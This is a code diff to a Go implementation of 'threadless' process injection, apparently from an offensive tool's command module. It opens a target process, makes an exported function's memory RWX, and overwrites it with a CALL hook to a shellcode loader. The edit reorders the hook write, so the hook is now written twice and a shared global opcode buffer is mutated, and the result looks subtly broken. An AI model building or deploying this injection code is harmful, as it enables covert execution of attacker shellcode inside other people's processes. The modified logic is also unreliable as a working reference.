@@ -41,8 +41,13 @@ var (
 		0xE0, 0x90,
 	}
 
-	callOpCode = []byte{0xe8, 0, 0, 0, 0}
-	uintsize   = unsafe.Sizeof(uintptr(0))
+	callOpCode  = []byte{0xe8, 0, 0, 0, 0}
+	uintsize    = unsafe.Sizeof(uintptr(0))
+	oldProtect  = windows.PAGE_READWRITE
+	
+	// Package-level variables for payload (matching reference)
+	payload     []byte
+	payloadSize int
 )
 
 type ThreadlessInjectCommand struct{}
@@ -215,21 +220,7 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 	// Write function original bytes to loader, so it can restore after one-time execution
 	generateHook(payload, originalBytes)
 
-	// Calculate relative address for the CALL instruction (but don't write hook yet!)
-	relativeLoaderAddress := uint32(uint64(loaderAddress) - (uint64(exportAddress) + 5))
-	relativeLoaderAddressArray := make([]byte, uintsize)
-	binary.LittleEndian.PutUint32(relativeLoaderAddressArray, relativeLoaderAddress)
-
-	// Build the 5-byte CALL instruction
-	hook := make([]byte, 5)
-	copy(hook, callOpCode)
-	hook[1] = relativeLoaderAddressArray[0]
-	hook[2] = relativeLoaderAddressArray[1]
-	hook[3] = relativeLoaderAddressArray[2]
-	hook[4] = relativeLoaderAddressArray[3]
-	output += fmt.Sprintf("[+] Hook bytes: %x\n", hook)
-
-	// Unprotect remote function memory (but don't write hook yet!)
+	// Unprotect remote function memory
 	var oldProtect uint32
 	ret, _, _ = virtualProtectEx.Call(
 		uintptr(pHandle),
@@ -242,6 +233,30 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 		return output, fmt.Errorf("failed to unprotect function memory")
 	}
 	output += "[+] Changed function memory protection to RWX\n"
+
+	// Calculate relative address for the CALL instruction
+	var relativeLoaderAddress = (uint32)((uint64)(loaderAddress) - ((uint64)(exportAddress) + 5))
+	relativeLoaderAddressArray := make([]byte, uintsize)
+	binary.LittleEndian.PutUint32(relativeLoaderAddressArray, relativeLoaderAddress)
+
+	callOpCode[1] = relativeLoaderAddressArray[0]
+	callOpCode[2] = relativeLoaderAddressArray[1]
+	callOpCode[3] = relativeLoaderAddressArray[2]
+	callOpCode[4] = relativeLoaderAddressArray[3]
+	output += fmt.Sprintf("[+] Hook bytes: %x\n", callOpCode)
+
+	// Hook the remote function
+	ret, _, _ = writeProcessMemory.Call(
+		uintptr(pHandle),
+		exportAddress,
+		(uintptr)(unsafe.Pointer(&callOpCode[0])),
+		uintptr(len(callOpCode)),
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("failed to hook the function")
+	}
+	output += fmt.Sprintf("[+] Wrote %d byte hook to function\n", len(callOpCode))
 
 	// Unprotect loader allocated memory
 	ret, _, _ = virtualProtectEx.Call(
@@ -285,14 +300,14 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 	ret, _, _ = writeProcessMemory.Call(
 		uintptr(pHandle),
 		exportAddress,
-		uintptr(unsafe.Pointer(&hook[0])),
-		uintptr(len(hook)),
+		uintptr(unsafe.Pointer(&callOpCode[0])),
+		uintptr(len(callOpCode)),
 		uintptr(unsafe.Pointer(&bytesRead)),
 	)
 	if ret == 0 {
 		return output, fmt.Errorf("failed to write hook")
 	}
-	output += fmt.Sprintf("[+] Wrote %d byte hook to function\n", bytesRead)
+	output += fmt.Sprintf("[+] Wrote %d byte hook to function\n", len(callOpCode))
 
 	// Restore function protection
 	ret, _, _ = virtualProtectEx.Call(
